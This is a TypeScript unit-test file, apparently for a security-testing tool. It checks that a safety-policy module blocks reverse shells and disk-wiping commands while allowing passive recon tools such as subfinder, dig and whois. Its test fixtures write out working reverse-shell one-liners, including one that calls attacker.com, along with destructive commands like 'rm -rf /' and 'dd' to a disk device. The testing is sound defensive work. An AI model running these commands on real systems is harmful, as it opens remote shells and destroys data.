/**
 * Safety Policies — Unit Tests
 *
 * Verifies that all block patterns, rate limit enforcement,
 * and scope validation work correctly. These are security-critical.
 */

import { describe, it, expect } from 'vitest';
import { checkSafetyPolicies, isCommandSafe, categorizeCommandRisk } from './safety_policies';

describe('checkSafetyPolicies', () => {
  // ─── Block Patterns ──────────────────────────────────────────────────────

  describe('reverse shell blocking', () => {
    const reverseShellCommands = [
      'nc -e /bin/sh 10.0.0.1 4444',
      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.0.0.1\',4444))"',
      'nc -e /bin/bash attacker.com 1337',
    ];

    for (const cmd of reverseShellCommands) {
      it(`should block: ${cmd.substring(0, 60)}...`, () => {
        const result = checkSafetyPolicies(cmd, 'example.com', 'active_testing');
        expect(result.allowed).toBe(false);
        expect(result.violations.some(v => v.severity === 'block')).toBe(true);
      });
    }
  });

  describe('destructive command blocking', () => {
    const destructiveCommands = [
      'rm -rf /',
      'rm -rf /home',
      'dd if=/dev/zero of=/dev/sda',
      'mkfs.ext4 /dev/sda',
    ];

    for (const cmd of destructiveCommands) {
      it(`should block: ${cmd}`, () => {
        const result = checkSafetyPolicies(cmd, 'example.com', 'utility');
        expect(result.allowed).toBe(false);
      });
    }
  });

  // ─── Safe Commands ───────────────────────────────────────────────────────

  describe('safe recon commands', () => {
    const safeCommands = [
      'subfinder -d example.com -json -silent',
      'httpx -l hosts.txt -json -td -sc',
      'whatweb -a 1 --log-json=- https://example.com',
      'dig example.com',
      'whois example.com',
    ];

    for (const cmd of safeCommands) {
      it(`should allow: ${cmd.substring(0, 60)}`, () => {
        const result = checkSafetyPolicies(cmd, 'example.com', 'recon');
        expect(result.allowed).toBe(true);
      });
    }
  });

  // ─── Rate Limit Enforcement ──────────────────────────────────────────────

  describe('rate limit enforcement', () => {
    it('should add rate limiting warnings to fast scanning commands', () => {
      const result = checkSafetyPolicies(
        'naabu -host example.com -top-ports 1000',
        'example.com',
        'recon'
      );
      // Should be allowed but may have warnings about rate limiting
      expect(result.allowed).toBe(true);
    });
  });
});

describe('isCommandSafe', () => {
  it('should return true for passive recon commands', () => {
    expect(isCommandSafe('dig example.com')).toBe(true);
    expect(isCommandSafe('whois example.com')).toBe(true);
  });

  it('should return false for destructive commands', () => {
    expect(isCommandSafe('rm -rf /')).toBe(false);
  });
});

describe('categorizeCommandRisk', () => {
  it('should categorize passive recon as safe', () => {
    const risk = categorizeCommandRisk('subfinder -d example.com');
    expect(risk).toBe('safe');
  });

  it('should categorize active testing tools appropriately', () => {
    const risk = categorizeCommandRisk('sqlmap -u http://example.com?id=1');
    expect(['controlled', 'restricted', 'dangerous']).toContain(risk);
  });
});
